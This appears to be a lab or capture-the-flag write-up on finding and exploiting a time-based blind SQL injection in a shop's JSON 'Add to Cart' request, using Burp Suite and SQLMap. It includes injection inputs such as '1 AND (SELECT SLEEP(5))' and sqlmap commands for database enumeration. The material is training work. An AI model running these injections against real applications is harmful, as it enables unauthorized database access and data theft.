# SQLMap – SQL Injection Exploitation via JSON POST Parameter

## Objective

Identify and exploit a blind SQL injection vulnerability in a JSON-based POST request used by an “Add to Cart” feature in a web application.

---

## Case #1 – Identifying the Attack Surface

### Goal

Locate a potential input point for SQL injection.

### Initial Approach

I manually browsed the application (`shop.html`, `index.html`) and interacted with available buttons while monitoring the browser’s Network tab.

Most requests returned static HTML and did not expose obvious parameters.

### Key Observation

When clicking **“Add to Cart”**, the browser sent a POST request to:

action.php

with the JSON body:

{"id":1}

This request became the main candidate for SQL injection testing.

---

## Case #2 – Capturing the Request with Burp Suite

### Goal

Obtain a complete and reliable HTTP request that accurately reflects how the application communicates with the backend, ensuring SQLMap can reproduce the request without missing headers or JSON formatting details.

### Method

I configured **Burp Suite as an intercepting proxy** and routed the browser traffic through it.

By repeating the **“Add to Cart”** action while interception was enabled, Burp captured the exact HTTP request generated by the application, including:

- Request method and endpoint  
- Full HTTP headers (User-Agent, Origin, Referer, etc.)  
- Content-Type set to `application/json`  
- JSON request body containing the `id` parameter  

### Captured Request

POST /action.php HTTP/1.1  
Host: 154.57.164.72:30279  
Content-Type: application/json  
Origin: http://154.57.164.72:30279  

{"id":1}

### Creating request.txt

Instead of manually reconstructing the HTTP request (which can introduce formatting or header inconsistencies), I saved the full intercepted request into a file named:

request.txt

This file preserves the complete request structure, including:
- Request line
- Headers
- JSON body

### Why This Step Was Important

Using the raw request file ensures SQLMap:

- Replays the request exactly as the browser sends it  
- Accurately interprets JSON-based parameters  
- Avoids issues caused by missing headers or incorrect formatting  
- Improves reliability when testing blind SQL injection scenarios  

In this case, capturing the request via Burp Suite was essential because the vulnerability was not exposed through standard URL parameters but embedded within a structured API request.

---

## Case #3 – Understanding Why request.txt Was Required

### Goal

Understand why standard SQLMap usage failed.

### Initial Mistake

sqlmap -u "http://154.57.164.72:30279/action.php?id=1"

### Result

- No injectable parameter detected
- Parameter not dynamic

### Reason

The application does not use GET parameters.  
The injection point is inside a JSON POST body, which requires full request replication.

## Case #4 – Manual Injection Testing

### Goal

Check for SQL injection behavior manually.

### Baseline Request

curl -i -X POST "http://154.57.164.72:30279/action.php" \
-H "Content-Type: application/json" \
--data '{"id":1}'

### Boolean Testing

{"id":"1 AND 1=1"}  
{"id":"1 AND 1=2"}

### Result

- No visible response difference
- No output returned
- Likely blind SQL injection

---

## Case #5 – SQLMap JSON Testing

### Goal

Test JSON-based injection using SQLMap.

### Command Used

sqlmap -u "http://154.57.164.72:30279/action.php" \
--data='{"id":1}' \
--headers="Content-Type: application/json" \
--batch

### Result

- Required correct JSON handling
- Confirmed request could be processed by SQLMap

---

## Case #6 – Exploitation Using request.txt

### Goal

Exploit the vulnerability using the captured HTTP request.

### Method

I used Burp Suite to intercept and capture the full HTTP request generated by the “Add to Cart” action. This ensured that all relevant headers, cookies, and the JSON payload were preserved exactly as sent by the browser.

The captured request was then saved into a file called `request.txt` using a text editor (nano), allowing SQLMap to replay the request in its original format without manual reconstruction errors.

### Captured Request

POST /action.php HTTP/1.1  
Host: 154.57.164.72:30279  
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0  
Accept: */*  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate, br  
Referer: http://154.57.164.72:30279/shop.html  
Content-Type: application/json  
Origin: http://154.57.164.72:30279  
DNT: 1  
Connection: keep-alive  
Priority: u=0  

{"id":1}

### Goal

Exploit the vulnerability using the captured HTTP request.

### Command Used

sqlmap -r request.txt --batch --no-cast

### Result

SQLMap successfully identified:

- Injection type: Time-based blind SQL injection
- Backend: MySQL / MariaDB
- Technique: SLEEP-based payloads

Example payload:

1 AND (SELECT SLEEP(5))

## Case #7 – Database Enumeration Attempt

### Goal

Extract database information.

### Command Used

sqlmap -r request.txt --dbs --batch --no-cast

### Result

- Time-based extraction detected
- Database enumeration unstable due to timing delays
- Results incomplete under default settings

---

## Key Takeaways

- Real attack surfaces are often found through manual interaction, not guessing URLs
- Burp Suite is essential for capturing full HTTP requests
- JSON POST parameters require full request replication using `-r request.txt`
- Blind SQL injection may not produce visible output differences
- Time-based SQL injection is slow but reliable
- SQLMap failures often come from incorrect request formats, not lack of vulnerability
- Understanding request structure is more important than tool usage
